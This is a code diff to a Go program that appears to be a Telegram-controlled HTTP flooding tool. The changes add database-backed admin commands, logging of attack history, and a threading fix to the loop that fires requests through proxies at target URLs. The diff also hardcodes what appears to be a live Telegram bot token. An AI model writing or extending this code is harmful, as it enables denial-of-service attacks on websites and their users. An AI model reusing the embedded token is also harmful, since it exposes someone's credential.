@@ -14,6 +14,7 @@ import (
 	"fmt"
 	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
 	"io/ioutil"
+	"main.go/database"
 	"math/rand"
 	"net/http"
 	"net/url"
@@ -26,17 +27,17 @@ import (
 
 var completeCount = 0
 var errorCount = 0
-var botToken = "" // replace u token bot
 
-// admin chat list
-var allowedChatIDs = map[int64]bool{
-	696300339: true,
-}
+var botToken = "1507944521:AAGO49vBJ9_TI4W3_MHpTRFdAV5Lvly9wtk" // replace u token bot
 
 type any interface{}
 
 func main() {
+	database.InitDB()
 	if botToken != "" {
+		if !database.IsAdmin(database.AdminUserID) {
+			database.AddAdmin(database.AdminUserID)
+		}
 		startBot(botToken)
 	} else {
 		startWithoutBot()
@@ -65,7 +66,7 @@ func startBot(botToken string) {
 
 	for update := range updates {
 		if update.Message != nil && update.Message.IsCommand() {
-			if allowedChatIDs[update.Message.Chat.ID] {
+			if database.IsAdmin(update.Message.Chat.ID) {
 				switch update.Message.Command() {
 				case "start":
 					fmt.Println("get command start", update.Message.Chat)
@@ -84,6 +85,28 @@ func startBot(botToken string) {
 					fmt.Println("get command start", args)
 
 					go startHTTPSPAM(telegramBot, update.Message.Chat.ID, args)
+				case "addAdmin":
+					args := strings.Split(update.Message.Text, " ")
+					if len(args) < 2 {
+						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Invalid command. Usage: /addAdmin %userID% (1)")
+						telegramBot.Send(msg)
+						continue
+					}
+					userID, _ := strconv.ParseInt(args[1], 10, 64)
+					database.AddAdmin(userID)
+					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Admin added with id: "+args[1])
+					telegramBot.Send(msg)
+				case "removeAdmin":
+					args := strings.Split(update.Message.Text, " ")
+					if len(args) < 2 {
+						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Invalid command. Usage: /removeAdmin %userID% (1)")
+						telegramBot.Send(msg)
+						continue
+					}
+					userID, _ := strconv.ParseInt(args[1], 10, 64)
+					database.DeleteAdmin(userID)
+					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Admin removed with id: "+args[1])
+					telegramBot.Send(msg)
 				}
 			} else {
 				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "You are not authorized to use this bot.")
@@ -143,6 +166,8 @@ func parseAndRunAttack(bot *tgbotapi.BotAPI, args []string, chatID int64) {
 	if proxies == nil {
 		proxies = make([]string, 0)
 	}
+
+	database.SaveAttackHistory(&chatID, strings.Join(args, " "), attackURL, true)
 
 	telegramRunAttacks(bot, attackURL, method, getData(method, data), getData(method, query), readProxiesFromFile(proxy), count, threads, chatID)
 }
@@ -247,6 +272,8 @@ func startWithoutBot() {
 	attackUrlPath := flag.String("urlPath", "", "path to a text document containing URLs for the spam attack")
 	flag.Parse()
 
+	database.SaveAttackHistory(nil, strings.Join(os.Args, " "), *attackUrl, true)
+
 	var requestData url.Values
 	var queryData url.Values
 
@@ -294,6 +321,7 @@ func startWithoutBot() {
 			for _, attackUrl := range urlAttack {
 				if attackUrl != "" {
 					for i := 1; i <= *threads; i++ {
+						wg.Add(1)
 						go func(url string, index int) {
 							defer wg.Done()
 							runAttacks(url, *method, requestData, queryData, proxies, totalRequests, i, &wg)
